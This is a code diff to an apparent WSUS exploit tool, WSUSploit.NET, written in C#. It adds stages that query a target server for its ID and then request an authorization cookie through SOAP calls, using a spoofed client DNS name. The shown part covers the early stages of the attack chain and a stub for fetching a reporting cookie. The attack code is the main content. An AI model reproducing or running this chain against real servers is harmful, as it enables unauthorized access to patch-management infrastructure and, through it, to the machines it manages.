@@ -15,18 +15,18 @@ Uri serverUri = new Uri(args[0]);
 Console.WriteLine($"[*] Running against {serverUri}");
 
 WSUSServer server = new WSUSServer(serverUri);
-string serverId = await server.GetServerId();
-
+await server.GetServerId();
+await server.GetAuthCookie();
 
 namespace WSUSploit.NET
 {
     class WSUSServer
-    {   
-        public string ServerId { get; set; }
+    {
+        public string ServerId { get; set; } = "";
         public int Port { get; set; }
         public Uri URL { get; set; }
-        public string AuthCookie { get; set; }
-        public string ReportingCookie { get; set; }
+        public string AuthCookie { get; set; } = "";
+        public string ReportingCookie { get; set; } = "";
 
         private readonly HttpClient _httpClient;
 
@@ -44,7 +44,7 @@ namespace WSUSploit.NET
             URL = url;
         }
 
-        public async Task<string> GetServerId()
+        public async Task GetServerId()
         {
             Console.WriteLine("[*] Fetching Server ID..."); 
 
@@ -60,7 +60,9 @@ namespace WSUSploit.NET
             var content = new StringContent(soapBody, Encoding.UTF8, "text/xml");
             content.Headers.Add("SOAPAction", "http://www.microsoft.com/SoftwareDistribution/GetRollupConfiguration");
             
-            var response = await _httpClient.PostAsync(this.URL + "/ReportingWebService/ReportingWebService.asmx", content);
+            var response = await _httpClient.PostAsync("/ReportingWebService/ReportingWebService.asmx", content);
+
+            response.EnsureSuccessStatusCode();
 
             var responseBody = await response.Content.ReadAsStringAsync();
             
@@ -68,7 +70,6 @@ namespace WSUSploit.NET
             XDocument xmlDoc = XDocument.Parse(responseBody);
 
             // Define namespaces
-            XNamespace soapNs = "http://schemas.xmlsoap.org/soap/envelope/";
             XNamespace msNs = "http://www.microsoft.com/SoftwareDistribution";
 
             // Extract ServerId
@@ -84,12 +85,51 @@ namespace WSUSploit.NET
 
             Console.WriteLine($"[*] ServerId: {serverId}");
 
-            return serverId;
+            this.ServerId = serverId;
         }
 
-        string GetAuthCookie(string target, string serverId)
+        public async Task GetAuthCookie()
         {
-            return "";
+            Console.WriteLine("[*] Fetching AuthCookie...");
+
+            string soapBody = $@"<?xml version=""1.0"" encoding=""utf-8""?>
+            <soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"">
+            <soap:Body>
+            <GetAuthorizationCookie xmlns=""http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService"">
+            <clientId>{this.ServerId}</clientId>
+            <targetGroupName></targetGroupName>
+            <dnsName>hawktrace.local</dnsName>
+            </GetAuthorizationCookie>
+            </soap:Body>
+            </soap:Envelope>";
+
+            var content = new StringContent(soapBody, Encoding.UTF8, "text/xml");
+            content.Headers.Add("SOAPAction", "http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie");
+
+            var response = await _httpClient.PostAsync("/SimpleAuthWebService/SimpleAuth.asmx", content);
+            
+            var responseBody = await response.Content.ReadAsStringAsync();
+
+            // Parse the XML
+            XDocument xmlDoc = XDocument.Parse(responseBody);
+
+            // Define namespace
+            XNamespace msNs = "http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService";
+
+            // Extract CookieData
+            string? cookieData = xmlDoc
+                .Descendants(msNs + "CookieData")
+                .FirstOrDefault()?.Value;
+
+            if (string.IsNullOrEmpty(cookieData))
+            {
+                Console.WriteLine("[!] ERROR: CookieData not found! Exiting...");
+                Environment.Exit(1);
+            }
+
+            Console.WriteLine($"[*] CookieData: {cookieData}"); 
+            
+            this.AuthCookie = cookieData;
         }
 
         string GetReportingCookie(string target, string authCookie)
